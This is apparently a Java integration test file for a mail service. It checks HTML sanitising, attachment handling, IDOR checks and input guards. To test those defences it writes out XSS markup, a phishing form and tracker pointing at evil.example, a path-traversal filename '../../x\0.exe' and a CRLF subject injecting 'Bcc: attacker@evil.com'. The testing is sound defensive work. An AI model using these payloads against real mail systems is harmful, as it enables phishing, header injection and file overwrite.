package com.mailapp.mail.service;

import com.icegreen.greenmail.configuration.GreenMailConfiguration;
import com.icegreen.greenmail.junit5.GreenMailExtension;
import com.icegreen.greenmail.util.ServerSetup;
import com.mailapp.dto.mail.MailDtos.*;
import com.mailapp.exception.AppException;
import com.mailapp.mail.DefaultMailConnectionFactory;
import com.mailapp.mail.AccessTokenProvider;
import com.mailapp.mail.config.MailConnectionProperties;
import com.mailapp.mail.folder.GmailFolderResolver;
import com.mailapp.model.*;
import com.mailapp.repository.GmailAccountRepository;
import com.mailapp.security.AesCipher;
import com.mailapp.service.AuditLogService;
import com.mailapp.service.SystemSettingService;
import jakarta.activation.DataHandler;
import jakarta.mail.Message;
import jakarta.mail.Session;
import jakarta.mail.Part;
import jakarta.mail.internet.*;
import jakarta.mail.util.ByteArrayDataSource;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.RegisterExtension;
import org.springframework.http.HttpStatus;
import org.springframework.mock.web.MockMultipartFile;
import org.springframework.web.multipart.MultipartFile;

import java.io.ByteArrayOutputStream;
import java.nio.charset.StandardCharsets;
import java.security.MessageDigest;
import java.util.List;
import java.util.Map;
import java.util.Optional;
import java.util.Properties;

import static org.junit.jupiter.api.Assertions.*;
import static org.mockito.ArgumentMatchers.*;
import static org.mockito.Mockito.*;

@DisplayName("Kiểm thử tích hợp MailService với GreenMail (M08/M10/M12/M16/M17)")
class MailServiceGreenMailIntegrationTest {

    @RegisterExtension
    static GreenMailExtension greenMail = new GreenMailExtension(new ServerSetup[]{
            new ServerSetup(0, "127.0.0.1", ServerSetup.PROTOCOL_IMAPS),
            new ServerSetup(0, "127.0.0.1", ServerSetup.PROTOCOL_SMTP)
    }).withConfiguration(GreenMailConfiguration.aConfig().withUser("alice@test.local", "alicePass123"));

    private AesCipher aesCipher;
    private GmailAccountRepository gmailAccountRepository;
    private SystemSettingService systemSettingService;
    private AuditLogService auditLogService;
    private MailServiceImpl mailService;

    private User userAlice;
    private User userBob;
    private GmailAccount aliceGmail;

    @BeforeEach
    void setUp() throws Exception {
        greenMail.purgeEmailFromAllMailboxes();

        aesCipher = new AesCipher("dCPN0qIeMrPFVyn/9c05Pq1O65Re+wsVplG7fEFU4dU=");
        MailConnectionProperties props = new MailConnectionProperties();
        props.setImapHost("127.0.0.1");
        props.setLocalTestTransport(true);
        props.setImapPort(greenMail.getImaps().getPort());
        props.setSmtpHost("127.0.0.1");
        props.setSmtpPort(greenMail.getSmtp().getPort());
        props.setRetryEnabled(false);
        props.setPoolEnabled(false);

        DefaultMailConnectionFactory factory = new DefaultMailConnectionFactory(
                props, aesCipher, mock(AccessTokenProvider.class), null);

        gmailAccountRepository = mock(GmailAccountRepository.class);
        systemSettingService = mock(SystemSettingService.class);
        auditLogService = mock(AuditLogService.class);

        when(systemSettingService.isMaintenanceMode()).thenReturn(false);
        when(systemSettingService.isSendMailEnabled()).thenReturn(true);
        when(systemSettingService.getMaxAttachmentSizeMb()).thenReturn(25);
        when(systemSettingService.getMailPageSize()).thenReturn(20);

        userAlice = new User(1L, "alice", "alice@mailapp.local", Role.USER);
        userBob = new User(2L, "bob", "bob@mailapp.local", Role.USER);

        aliceGmail = new GmailAccount();
        aliceGmail.setId(10L);
        aliceGmail.setUser(userAlice);
        aliceGmail.setEmail("alice@test.local");
        aliceGmail.setDisplayName("Alice Test");
        aliceGmail.setAuthType(AuthType.APP_PASSWORD);
        aliceGmail.setAppPasswordEncrypted(aesCipher.encrypt("alicePass123"));
        aliceGmail.setStatus(AccountStatus.ACTIVE);

        when(gmailAccountRepository.findByIdAndUserId(10L, 1L)).thenReturn(Optional.of(aliceGmail));

        mailService = new MailServiceImpl(
                gmailAccountRepository,
                factory,
                new GmailFolderResolver(),
                systemSettingService,
                auditLogService,
                new HtmlSanitizerService(),
                new MailHeaderAndRateGuard(30, 15),
                true // isolated GreenMail does not implement UIDPLUS
        );
    }

    @Test
    void previewDoesNotMarkUnreadMailSeenButDefaultDetailDoes() throws Exception {
        MimeMessage message = new MimeMessage(Session.getInstance(new Properties()));
        message.setFrom(new InternetAddress("sender@test.local"));
        message.setRecipient(Message.RecipientType.TO, new InternetAddress("alice@test.local"));
        message.setSubject("Preview unread");
        message.setText("Preview body", "UTF-8");
        message.saveChanges();
        greenMail.getUserManager().getUser("alice@test.local").deliver(message);

        MailListResponse unread = mailService.listMails(userAlice, 10L, "INBOX", 0, 20,
                null, true, null, null, null);
        assertEquals(1, unread.total());
        long uid = unread.items().getFirst().uid();
        long validity = unread.uidValidity();

        MailDetailResponse preview = mailService.getMailDetail(
                userAlice, 10L, "INBOX", uid, false, validity, false);
        assertEquals("Preview body", preview.textBody().trim());
        assertFalse(preview.flags().seen());
        AppException stale = assertThrows(AppException.class, () -> mailService.getMailDetail(
                userAlice, 10L, "INBOX", uid, false, validity + 1, false));
        assertEquals("UID_VALIDITY_CHANGED", stale.getCode());
        MailListResponse stillUnread = mailService.listMails(userAlice, 10L, "INBOX", 0, 20,
                null, true, null, null, null);
        assertEquals(1, stillUnread.total());
        assertFalse(stillUnread.items().getFirst().flags().seen());

        MailDetailResponse read = mailService.getMailDetail(
                userAlice, 10L, "INBOX", uid, false, validity);
        assertTrue(read.flags().seen());
        assertEquals(0, mailService.listMails(userAlice, 10L, "INBOX", 0, 20,
                null, true, null, null, null).total());
        assertTrue(mailService.getMailDetail(
                userAlice, 10L, "INBOX", uid, false, validity, false).flags().seen());
    }

    @Test
    @DisplayName("M08/M12: Thư multipart lồng, tiêu đề UTF-8 tiếng Việt, ảnh inline cid:, HTML độc hại XSS + tracker, filename ../../x.exe")
    void testReadComplexMaliciousMailAndDownloadAttachment() throws Exception {
        byte[] attachBytes = "Nội dung tệp báo cáo đồ án PTIT 2026!".getBytes(StandardCharsets.UTF_8);

        Session session = Session.getInstance(new Properties());
        MimeMessage msg = new MimeMessage(session);
        msg.setFrom(new InternetAddress("sender@ptit.edu.vn", "Phòng Đào Tạo", "UTF-8"));
        msg.setRecipient(Message.RecipientType.TO, new InternetAddress("alice@test.local"));
        msg.setSubject("Thông báo lịch bảo vệ đồ án tốt nghiệp tiếng Việt", "UTF-8");

        MimeMultipart mixed = new MimeMultipart("mixed");

        // Multipart/alternative lồng nhau
        MimeBodyPart altContainer = new MimeBodyPart();
        MimeMultipart alt = new MimeMultipart("alternative");

        MimeBodyPart plain = new MimeBodyPart();
        plain.setText("Nội dung văn bản thuần tiếng Việt.", "UTF-8");

        MimeBodyPart html = new MimeBodyPart();
        html.setContent("""
                <div>
                    <h1>Xin chào</h1>
                    <script>alert('XSS')</script>
                    <iframe src="https://evil.example/phish"></iframe>
                    <form action="https://evil.example/steal"><input type="password"/></form>
                    <p onclick="stealCookie()">Nội dung an toàn</p>
                    <img src="cid:logo123" alt="Inline Logo"/>
                    <img src="https://tracker.evil.example/open.gif" width="1" height="1"/>
                </div>
                """, "text/html; charset=UTF-8");
        alt.addBodyPart(plain);
        alt.addBodyPart(html);
        altContainer.setContent(alt);
        mixed.addBodyPart(altContainer);

        // Ảnh inline cid
        MimeBodyPart inlineImg = new MimeBodyPart();
        inlineImg.setDataHandler(new DataHandler(new ByteArrayDataSource(new byte[]{1, 2, 3, 4}, "image/png")));
        inlineImg.setHeader("Content-ID", "<logo123>");
        inlineImg.setDisposition(MimeBodyPart.INLINE);
        inlineImg.setFileName("logo.png");
        mixed.addBodyPart(inlineImg);

        // Tệp đính kèm với tên path traversal + ký tự điều khiển
        MimeBodyPart evilAttach = new MimeBodyPart();
        evilAttach.setDataHandler(new DataHandler(new ByteArrayDataSource(attachBytes, "text/plain")));
        evilAttach.setDisposition(MimeBodyPart.ATTACHMENT);
        evilAttach.setFileName("../../x\u0000.exe");
        mixed.addBodyPart(evilAttach);

        msg.setContent(mixed);
        msg.saveChanges();

        greenMail.getUserManager().getUser("alice@test.local").deliver(msg);

        // 1. Liệt kê thư mục & thư
        List<MailFolderDto> folders = mailService.listFolders(userAlice, 10L);
        assertTrue(folders.stream().anyMatch(f -> "INBOX".equals(f.type()) && f.total() == 1));

        MailListResponse list = mailService.listMails(userAlice, 10L, "INBOX", 0, 30, null, null, null, null, null);
        assertEquals(1, list.items().size());
        MailSummaryDto summary = list.items().get(0);
        assertEquals("Thông báo lịch bảo vệ đồ án tốt nghiệp tiếng Việt", summary.subject());
        assertFalse(summary.flags().seen());
        assertTrue(summary.hasAttachment());

        // 2. Đọc chi tiết với loadRemote=false (mặc định)
        MailDetailResponse detail = mailService.getMailDetail(userAlice, 10L, "INBOX", summary.uid(), false, list.uidValidity());
        assertTrue(detail.flags().seen(), "Đọc chi tiết phải tự động đánh dấu \\Seen");
        assertTrue(detail.hasBlockedRemoteImages(), "Phải phát hiện và chặn ảnh theo dõi từ xa");
        assertNotNull(detail.htmlBody());
        assertFalse(detail.htmlBody().contains("<script"), "Phải loại bỏ thẻ script");
        assertFalse(detail.htmlBody().contains("<iframe"), "Phải loại bỏ thẻ iframe");
        assertFalse(detail.htmlBody().contains("<form"), "Phải loại bỏ thẻ form");
        assertFalse(detail.htmlBody().contains("onclick"), "Phải loại bỏ sự kiện onclick");
        assertFalse(detail.htmlBody().contains("src=\"https://tracker.evil.example"), "Phải chặn ảnh tracker khi loadRemote=false");
        assertTrue(detail.htmlBody().contains("cid:logo123"), "Phải giữ lại ảnh inline cid:");

        // Kiểm tra làm sạch tên tệp đính kèm
        assertEquals(2, detail.attachments().size());
        MailAttachmentDto secondAttach = detail.attachments().get(1);
        assertEquals("x.exe", secondAttach.filename(), "Tên tệp ../../x\\0.exe phải được làm sạch thành x.exe");

        // 3. Đọc chi tiết với loadRemote=true
        MailDetailResponse detailRemote = mailService.getMailDetail(userAlice, 10L, "INBOX", summary.uid(), true, list.uidValidity());
        assertFalse(detailRemote.hasBlockedRemoteImages());
        assertTrue(detailRemote.htmlBody().contains("https://tracker.evil.example/open.gif"));

        // 4. Tải tệp đính kèm dạng stream và so SHA-256
        MailService.AttachmentDownloadHandle handle = mailService.prepareAttachmentDownload(
                userAlice, 10L, "INBOX", summary.uid(), 1, list.uidValidity());
        assertEquals("x.exe", handle.sanitizedFilename());
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        handle.streamer().streamTo(baos);
        assertArrayEquals(sha256(attachBytes), sha256(baos.toByteArray()), "SHA-256 tệp tải về phải khớp tuyệt đối");

        // 5. Kiểm tra uidValidity đổi -> 409 UID_VALIDITY_CHANGED
        AppException uidEx = assertThrows(AppException.class, () ->
                mailService.getMailDetail(userAlice, 10L, "INBOX", summary.uid(), false, list.uidValidity() + 999L));
        assertEquals(HttpStatus.CONFLICT, uidEx.getStatus());
        assertEquals("UID_VALIDITY_CHANGED", uidEx.getCode());
    }

    @Test
    @DisplayName("M10/M16/M17: Gửi thư kèm đính kèm, tìm kiếm, phân trang, cập nhật cờ, xóa vào Thùng rác rồi xóa vĩnh viễn")
    void testSendSearchPaginateFlagsAndDeleteLifecycle() throws Exception {
        // Gửi 3 thư tới chính alice@test.local (1 thư có đính kèm)
        for (int i = 1; i <= 3; i++) {
            SendMailRequest req = new SendMailRequest(
                    10L,
                    List.of("alice@test.local"),
                    null, null,
                    "Báo cáo tuần " + i,
                    "Nội dung báo cáo số " + i,
                    "<p>Nội dung <b>HTML</b> số " + i + "</p>",
                    null, null
            );
            List<MultipartFile> files = (i == 3)
                    ? List.of(new MockMultipartFile("attachments", "baocao.txt", "text/plain", "hello ptit".getBytes(StandardCharsets.UTF_8)))
                    : null;

            SendMailResponse sent = mailService.sendMail(userAlice, req, files, "127.0.0.1");
            assertEquals("SENT", sent.status());
            assertNotNull(sent.messageId());
        }
        verify(auditLogService, times(3)).prepareMailMutation(eq(1L), eq("SEND_MAIL"), contains("a***@test.local"), eq("127.0.0.1"));
        verify(auditLogService, times(3)).finishMailMutation(isNull(), eq(true), isNull());

        // Phân trang (size=2, mới nhất trước)
        MailListResponse page0 = mailService.listMails(userAlice, 10L, "INBOX", 0, 2, null, null, null, null, null);
        assertEquals(3, page0.total());
        assertEquals(2, page0.items().size());
        assertTrue(page0.hasMore());
        assertEquals("Báo cáo tuần 3", page0.items().get(0).subject());

        MailListResponse page1 = mailService.listMails(userAlice, 10L, "INBOX", 1, 2, null, null, null, null, null);
        assertEquals(1, page1.items().size());
        assertFalse(page1.hasMore());

        // Tìm kiếm theo từ khóa
        MailListResponse searchRes = mailService.listMails(userAlice, 10L, "INBOX", 0, 10, "tuần 2", null, null, null, null);
        assertEquals(1, searchRes.items().size());
        long targetUid = searchRes.items().get(0).uid();

        // Cập nhật cờ (M17: seen=true, flagged=true)
        MailFlagsDto updatedFlags = mailService.updateFlags(userAlice, 10L, "INBOX", targetUid,
                new UpdateFlagsRequest(true, true), page0.uidValidity(), "127.0.0.1");
        assertTrue(updatedFlags.seen());
        assertTrue(updatedFlags.flagged());
        verify(auditLogService).prepareMailMutation(eq(1L), eq("MAIL_FLAG_CHANGE"), contains("uid=" + targetUid), eq("127.0.0.1"));
        verify(auditLogService).finishMailMutation(isNull(), eq(true), contains("starred=true, seen=true"));

        // Chặn xóa vĩnh viễn khi thư đang ở INBOX
        AppException permEx = assertThrows(AppException.class, () ->
                mailService.deleteMail(userAlice, 10L, "INBOX", targetUid, true, null, "127.0.0.1"));
        assertEquals(HttpStatus.BAD_REQUEST, permEx.getStatus());
        assertEquals("PERMANENT_DELETE_REQUIRES_TRASH", permEx.getCode());

        // Xóa mềm (chuyển vào Thùng rác)
        Map<String, Object> softDel = mailService.deleteMail(userAlice, 10L, "INBOX", targetUid, false, null, "127.0.0.1");
        assertEquals("DELETED", softDel.get("status"));
        assertEquals(false, softDel.get("permanent"));

        // Kiểm tra thư đã sang Thùng rác, rồi xóa vĩnh viễn trong Thùng rác
        MailListResponse trashList = mailService.listMails(userAlice, 10L, "TRASH", 0, 10, null, null, null, null, null);
        assertEquals(1, trashList.items().size());
        long trashUid = trashList.items().get(0).uid();

        Map<String, Object> hardDel = mailService.deleteMail(userAlice, 10L, "TRASH", trashUid, true, null, "127.0.0.1");
        assertEquals("DELETED", hardDel.get("status"));
        assertEquals(true, hardDel.get("permanent"));

        MailListResponse trashAfter = mailService.listMails(userAlice, 10L, "TRASH", 0, 10, null, null, null, null, null);
        assertEquals(0, trashAfter.items().size());
        verify(auditLogService, times(2)).prepareMailMutation(eq(1L), eq("MAIL_DELETE"), anyString(), eq("127.0.0.1"));
        verify(auditLogService, times(5)).finishMailMutation(isNull(), eq(true), isNull());
    }

    @Test
    void attachmentFilteringAndDownloadUseIdenticalRecursiveMimeOrder() throws Exception {
        Session session = greenMail.getSmtp().createSession();
        MimeMessage outer = new MimeMessage(session);
        outer.setFrom(new InternetAddress("sender@test.local"));
        outer.setRecipient(Message.RecipientType.TO, new InternetAddress("alice@test.local"));
        outer.setSubject("UTF-8 nested attachments", "UTF-8");

        MimeMessage embedded = new MimeMessage(session);
        embedded.setSubject("Nested");
        MimeMultipart embeddedParts = new MimeMultipart("mixed");
        MimeBodyPart embeddedText = new MimeBodyPart();
        embeddedText.setText("Nested plain text", "UTF-8");
        embeddedParts.addBodyPart(embeddedText);
        byte[] pdf = "%PDF-1.4\nfixture\n%%EOF".getBytes(StandardCharsets.UTF_8);
        embeddedParts.addBodyPart(attachment("nested.pdf", "application/pdf", pdf));
        byte[] secondPdf = "%PDF-1.4\nsecond fixture\n%%EOF".getBytes(StandardCharsets.UTF_8);
        embeddedParts.addBodyPart(attachment("nested.pdf", "application/pdf", secondPdf));
        embedded.setContent(embeddedParts);
        embedded.saveChanges();

        MimeMultipart outerParts = new MimeMultipart("mixed");
        MimeBodyPart forwarded = new MimeBodyPart();
        forwarded.setContent(embedded, "message/rfc822");
        outerParts.addBodyPart(forwarded);
        byte[] text = "Xin chào".getBytes(StandardCharsets.UTF_8);
        outerParts.addBodyPart(attachment("notes.txt", "text/plain", text));
        outer.setContent(outerParts);
        outer.saveChanges();
        greenMail.getUserManager().getUser("alice@test.local").deliver(outer);

        // multipart/mixed alone does not mean the message has an attachment.
        MimeMessage noAttachments = new MimeMessage(session);
        noAttachments.setFrom(new InternetAddress("sender@test.local"));
        noAttachments.setRecipient(Message.RecipientType.TO, new InternetAddress("alice@test.local"));
        noAttachments.setSubject("No attachments");
        MimeMultipart plainParts = new MimeMultipart("mixed");
        MimeBodyPart plain = new MimeBodyPart();
        plain.setText("Plain content", "UTF-8");
        plainParts.addBodyPart(plain);
        noAttachments.setContent(plainParts);
        noAttachments.saveChanges();
        greenMail.getUserManager().getUser("alice@test.local").deliver(noAttachments);

        MailListResponse yes = mailService.listMails(userAlice, 10L, "INBOX", 0, 0,
                null, null, true, null, null);
        assertEquals(20, yes.size());
        assertEquals(1, yes.total());
        assertEquals(3, yes.items().getFirst().attachmentCount());
        MailListResponse no = mailService.listMails(userAlice, 10L, "INBOX", 0, 20,
                null, null, false, null, null);
        assertEquals(1, no.total());
        assertEquals("No attachments", no.items().getFirst().subject());

        long uid = yes.items().getFirst().uid();
        MailDetailResponse detail = mailService.getMailDetail(userAlice, 10L, "INBOX", uid, false, yes.uidValidity());
        assertEquals(List.of("nested.pdf", "nested.pdf", "notes.txt"), detail.attachments().stream().map(MailAttachmentDto::filename).toList());
        assertEquals(List.of(0, 1, 2), detail.attachments().stream().map(MailAttachmentDto::index).toList());
        assertTrue(detail.attachments().stream().allMatch(a -> a.size() == a.sizeBytes()
                && !"EXACT".equals(a.sizeAccuracy().name())));
        for (int i = 0; i < 3; i++) {
            MailService.AttachmentDownloadHandle handle = mailService.prepareAttachmentDownload(
                    userAlice, 10L, "INBOX", uid, i, yes.uidValidity());
            ByteArrayOutputStream downloaded = new ByteArrayOutputStream();
            handle.streamer().streamTo(downloaded);
            assertArrayEquals(i == 0 ? pdf : i == 1 ? secondPdf : text, downloaded.toByteArray());
            assertEquals(downloaded.size(), handle.estimatedSize());
        }
    }

    @Test
    void rejectsOversizedSubjectAndBodyBeforeSending() {
        SendMailRequest subjectTooLong = new SendMailRequest(10L, List.of("alice@test.local"),
                null, null, "x".repeat(201), "body", null, null, null);
        SendMailRequest bodyTooLong = new SendMailRequest(10L, List.of("alice@test.local"),
                null, null, "subject", "é".repeat(524_289), null, null, null);
        for (SendMailRequest request : List.of(subjectTooLong, bodyTooLong)) {
            AppException failure = assertThrows(AppException.class,
                    () -> mailService.sendMail(userAlice, request, List.of(), "127.0.0.1"));
            assertEquals(HttpStatus.BAD_REQUEST, failure.getStatus());
            assertEquals("VALIDATION_ERROR", failure.getCode());
        }
        verifyNoInteractions(auditLogService);
        assertEquals(0, greenMail.getReceivedMessages().length);
    }

    @Test
    void attachmentLimitIsCheckedAgainstDecodedBytesBeforeResponse() throws Exception {
        when(systemSettingService.getMaxAttachmentSizeMb()).thenReturn(1);
        Session session = greenMail.getSmtp().createSession();
        MimeMessage message = new MimeMessage(session);
        message.setFrom(new InternetAddress("sender@test.local"));
        message.setRecipient(Message.RecipientType.TO, new InternetAddress("alice@test.local"));
        message.setSubject("attachment limit");
        MimeMultipart parts = new MimeMultipart("mixed");
        MimeBodyPart text = new MimeBodyPart();
        text.setText("body");
        parts.addBodyPart(text);
        parts.addBodyPart(attachment("too-large.bin", "application/octet-stream", new byte[1024 * 1024 + 1]));
        message.setContent(parts);
        message.saveChanges();
        greenMail.getUserManager().getUser("alice@test.local").deliver(message);
        MailListResponse list = mailService.listMails(userAlice, 10L, "INBOX", 0, 10, null, null, null, null, null);
        long uid = list.items().getFirst().uid();
        AppException failure = assertThrows(AppException.class, () -> mailService.prepareAttachmentDownload(
                userAlice, 10L, "INBOX", uid, 0, list.uidValidity()));
        assertEquals(HttpStatus.PAYLOAD_TOO_LARGE, failure.getStatus());
        assertEquals("PAYLOAD_TOO_LARGE", failure.getCode());
    }

    private static MimeBodyPart attachment(String filename, String type, byte[] bytes) throws Exception {
        MimeBodyPart part = new MimeBodyPart();
        part.setDataHandler(new DataHandler(new ByteArrayDataSource(bytes, type)));
        part.setFileName(filename);
        part.setDisposition(Part.ATTACHMENT);
        // Explicit MIME base64 keeps every attachment byte, including a PDF's
        // terminal LF, distinct from the multipart boundary's framing CRLF.
        part.setHeader("Content-Transfer-Encoding", "base64");
        return part;
    }

    @Test
    void fiveIndependentIncomingMimeFixturesCoverOriginalAcceptanceCases() throws Exception {
        Session session = greenMail.getSmtp().createSession();
        byte[] pdf = validSmallPdf();
        ByteArrayOutputStream pngOutput = new ByteArrayOutputStream();
        assertTrue(javax.imageio.ImageIO.write(new java.awt.image.BufferedImage(1, 1,
                java.awt.image.BufferedImage.TYPE_INT_RGB), "png", pngOutput));
        byte[] png = pngOutput.toByteArray();
        byte[] text = "fixture attachment".getBytes(StandardCharsets.UTF_8);
        List<String> subjects = List.of("fixture plain", "fixture HTML only", "fixture PDF", "fixture multiple", "fixture tiếng Việt");
        for (int i = 0; i < subjects.size(); i++) {
            MimeMessage message = new MimeMessage(session);
            message.setFrom(new InternetAddress("fixture@test.local", "Người gửi", "UTF-8"));
            message.setRecipient(Message.RecipientType.TO, new InternetAddress("alice@test.local"));
            message.setSubject(subjects.get(i), "UTF-8");
            if (i == 1) {
                // True incoming HTML-only MIME, not our outgoing text alternative.
                message.setContent("<p>fixture HTML</p>", "text/html; charset=UTF-8");
            } else if (i == 2 || i == 3) {
                MimeMultipart mixed = new MimeMultipart("mixed");
                MimeBodyPart body = new MimeBodyPart();
                body.setText("fixture body", "UTF-8");
                mixed.addBodyPart(body);
                if (i == 2) mixed.addBodyPart(attachment("report.pdf", "application/pdf", pdf));
                else {
                    mixed.addBodyPart(attachment("image.png", "image/png", png));
                    mixed.addBodyPart(attachment("notes.txt", "text/plain", text));
                }
                message.setContent(mixed);
            } else {
                message.setText(i == 4 ? "Tiếng Việt có dấu" : "fixture plain body", "UTF-8");
            }
            message.saveChanges();
            greenMail.getUserManager().getUser("alice@test.local").deliver(message);
        }
        MailListResponse all = mailService.listMails(userAlice, 10L, "INBOX", 0, 20, null, null, null, null, null);
        assertEquals(5, all.total());
        for (MailSummaryDto summary : all.items()) {
            int fixture = subjects.indexOf(summary.subject());
            assertTrue(fixture >= 0);
            MailDetailResponse detail = mailService.getMailDetail(userAlice, 10L, "INBOX", summary.uid(),
                    false, all.uidValidity(), false);
            assertEquals(summary.subject(), detail.subject());
            assertEquals(fixture == 2 ? 1 : fixture == 3 ? 2 : 0, summary.attachmentCount());
            assertEquals(summary.attachmentCount(), detail.attachments().size());
            if (fixture == 0) assertEquals("fixture plain body", detail.textBody().trim());
            if (fixture == 1) assertTrue(detail.htmlBody().contains("fixture HTML"));
            if (fixture == 4) assertEquals("Tiếng Việt có dấu", detail.textBody().trim());
            for (MailAttachmentDto metadata : detail.attachments()) {
                byte[] expected = fixture == 2 ? pdf : metadata.index() == 0 ? png : text;
                ByteArrayOutputStream downloaded = new ByteArrayOutputStream();
                try (var handle = mailService.prepareAttachmentDownload(userAlice, 10L, "INBOX", summary.uid(),
                        metadata.index(), all.uidValidity())) {
                    handle.streamer().streamTo(downloaded);
                }
                assertArrayEquals(expected, downloaded.toByteArray());
            }
        }
    }

    // Minimal valid one-page PDF with correctly computed xref offsets; this is
    // a real file fixture rather than arbitrary bytes beginning with %PDF.
    private static byte[] validSmallPdf() {
        String[] objects = {
                "<< /Type /Catalog /Pages 2 0 R >>",
                "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
                "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 72 72] /Resources << >> /Contents 4 0 R >>",
                "<< /Length 4 >>\nstream\nq\nQ\nendstream"
        };
        StringBuilder pdf = new StringBuilder("%PDF-1.4\n");
        int[] offsets = new int[objects.length];
        for (int i = 0; i < objects.length; i++) {
            offsets[i] = pdf.length();
            pdf.append(i + 1).append(" 0 obj\n").append(objects[i]).append("\nendobj\n");
        }
        int xref = pdf.length();
        pdf.append("xref\n0 5\n0000000000 65535 f \n");
        for (int offset : offsets) pdf.append(String.format(java.util.Locale.ROOT, "%010d 00000 n \n", offset));
        pdf.append("trailer\n<< /Size 5 /Root 1 0 R >>\nstartxref\n").append(xref).append("\n%%EOF\n");
        return pdf.toString().getBytes(StandardCharsets.US_ASCII);
    }

    @Test
    void outgoingAttachmentsPreserveExactBytesAcrossSmtpAndImap() throws Exception {
        byte[] pdf = validSmallPdf();
        byte[] text = "Tiếng Việt\nsecond line\r\nlast line\n".getBytes(StandardCharsets.UTF_8);
        ByteArrayOutputStream image = new ByteArrayOutputStream();
        assertTrue(javax.imageio.ImageIO.write(new java.awt.image.BufferedImage(1, 1,
                java.awt.image.BufferedImage.TYPE_INT_RGB), "png", image));
        byte[] png = image.toByteArray();
        List<byte[]> expected = List.of(pdf, png, text, new byte[0]);
        List<MultipartFile> files = List.of(
                new MockMultipartFile("attachments", "report.pdf", "application/pdf", pdf),
                new MockMultipartFile("attachments", "image.png", "image/png", png),
                new MockMultipartFile("attachments", "notes.txt", "text/plain", text),
                new MockMultipartFile("attachments", "empty.txt", "text/plain", new byte[0]));
        SendMailRequest request = new SendMailRequest(10L, List.of("alice@test.local"),
                null, null, "Byte preservation", "Nội dung tiếng Việt", "<p>Tiếng Việt</p>", null, null);
        assertEquals("SENT", mailService.sendMail(userAlice, request, files, "127.0.0.1").status());
        MailListResponse list = mailService.listMails(userAlice, 10L, "INBOX", 0, 10,
                "Byte preservation", null, null, null, null);
        assertEquals(1, list.total());
        long uid = list.items().getFirst().uid();
        MailDetailResponse detail = mailService.getMailDetail(userAlice, 10L, "INBOX", uid,
                false, list.uidValidity(), false);
        assertEquals(4, detail.attachments().size());
        assertEquals("Nội dung tiếng Việt", detail.textBody().trim());
        for (int index = 0; index < expected.size(); index++) {
            ByteArrayOutputStream downloaded = new ByteArrayOutputStream();
            try (var handle = mailService.prepareAttachmentDownload(userAlice, 10L, "INBOX", uid,
                    index, list.uidValidity())) {
                handle.streamer().streamTo(downloaded);
                assertEquals(expected.get(index).length, handle.estimatedSize());
            }
            assertArrayEquals(expected.get(index), downloaded.toByteArray(), "Attachment index " + index);
        }
    }

    @Test
    @DisplayName("Bảo mật: IDOR, NEEDS_REAUTH, CRLF Header Injection, vượt MAX_ATTACHMENT_SIZE_MB, tắt ALLOW_SEND_MAIL")
    void testSecurityGuards() {
        // 1. Chống IDOR: Bob không được đọc Gmail của Alice
        AppException idorEx = assertThrows(AppException.class, () ->
                mailService.listFolders(userBob, 10L));
        assertEquals(HttpStatus.NOT_FOUND, idorEx.getStatus());
        assertEquals("GMAIL_NOT_OWNED", idorEx.getCode());
        AppException missingEx = assertThrows(AppException.class, () ->
                mailService.listFolders(userBob, 999L));
        assertEquals(idorEx.getStatus(), missingEx.getStatus());
        assertEquals(idorEx.getCode(), missingEx.getCode());
        assertEquals(idorEx.getMessage(), missingEx.getMessage());

        // 2. NEEDS_REAUTH -> 422 GMAIL_NEEDS_REAUTH
        aliceGmail.setStatus(AccountStatus.NEEDS_REAUTH);
        AppException reauthEx = assertThrows(AppException.class, () ->
                mailService.listFolders(userAlice, 10L));
        assertEquals(HttpStatus.UNPROCESSABLE_ENTITY, reauthEx.getStatus());
        assertEquals("GMAIL_NEEDS_REAUTH", reauthEx.getCode());
        aliceGmail.setStatus(AccountStatus.ACTIVE);

        // 3. Tiêm CRLF vào Subject
        SendMailRequest crlfReq = new SendMailRequest(
                10L, List.of("victim@test.local"), null, null,
                "Hello\r\nBcc: attacker@evil.com", "body", null, null, null);
        AppException crlfEx = assertThrows(AppException.class, () ->
                mailService.sendMail(userAlice, crlfReq, null, "127.0.0.1"));
        assertEquals(HttpStatus.BAD_REQUEST, crlfEx.getStatus());
        assertEquals("HEADER_INJECTION_DETECTED", crlfEx.getCode());

        // 4. Vượt MAX_ATTACHMENT_SIZE_MB (đặt giới hạn 1 MB, gửi 1.5 MB)
        when(systemSettingService.getMaxAttachmentSizeMb()).thenReturn(1);
        byte[] bigData = new byte[1536 * 1024];
        MockMultipartFile bigFile = new MockMultipartFile("attachments", "huge.bin", "application/octet-stream", bigData);
        SendMailRequest okReq = new SendMailRequest(
                10L, List.of("alice@test.local"), null, null, "Test", "Body", null, null, null);
        AppException sizeEx = assertThrows(AppException.class, () ->
                mailService.sendMail(userAlice, okReq, List.of(bigFile), "127.0.0.1"));
        assertEquals(HttpStatus.PAYLOAD_TOO_LARGE, sizeEx.getStatus());
        assertEquals("PAYLOAD_TOO_LARGE", sizeEx.getCode());
        when(systemSettingService.getMaxAttachmentSizeMb()).thenReturn(25);

        // 5. Gửi khi cờ ALLOW_SEND_MAIL=false
        when(systemSettingService.isSendMailEnabled()).thenReturn(false);
        AppException disabledEx = assertThrows(AppException.class, () ->
                mailService.sendMail(userAlice, okReq, null, "127.0.0.1"));
        assertEquals(HttpStatus.FORBIDDEN, disabledEx.getStatus());
        assertEquals("FEATURE_DISABLED", disabledEx.getCode());
    }

    @Test
    @DisplayName("Hành vi xóa đúng chuẩn Gmail ([Gmail]/Trash & [Gmail]/All Mail): xóa mặc định sang Trash, trong Trash chỉ xóa vĩnh viễn khi permanent=true")
    void testGmailLikeTrashStructureMoveAndPermanentDeleteGuard() throws Exception {
        // Tạo cấu trúc thư mục giống Gmail thật trên GreenMail
        MailConnectionProperties props = new MailConnectionProperties();
        props.setImapHost("127.0.0.1");
        props.setLocalTestTransport(true);
        props.setImapPort(greenMail.getImaps().getPort());
        props.setRetryEnabled(false);
        props.setPoolEnabled(false);
        DefaultMailConnectionFactory factory = new DefaultMailConnectionFactory(
                props, aesCipher, mock(AccessTokenProvider.class), null);

        try (var imap = factory.openImap(aliceGmail)) {
            jakarta.mail.Folder gmailTrash = imap.getStore().getFolder("[Gmail]/Trash");
